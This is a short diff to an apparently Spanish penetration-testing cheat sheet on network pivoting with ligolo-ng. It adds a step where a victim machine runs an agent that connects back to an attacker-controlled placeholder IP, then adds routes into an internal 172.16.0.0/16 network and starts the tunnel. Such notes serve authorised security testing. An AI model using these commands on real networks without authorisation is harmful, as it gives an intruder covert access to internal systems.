@@ -24,7 +24,15 @@ sudo ip link set ligolo up
 
 # Start proxy
 ./proxy -selfcert -laddr 0.0.0.0:11601
+```
 
+**Paso 2: Conectar desde la víctima**
+```bash
+./agent -connect <TU_IP>:11601 -ignore-cert
+```
+
+##### Paso 3: Rutas e iniciar tunel
+```bash
 # After agent connects, add route to internal network
 sudo ip route add 172.16.0.0/16 dev ligolo
 
@@ -33,10 +41,6 @@ session          # select agent session
 start            # start tunnel
 ```
 
-**Paso 2: Conectar desde la víctima**
-```bash
-
-```
 
 
 ---
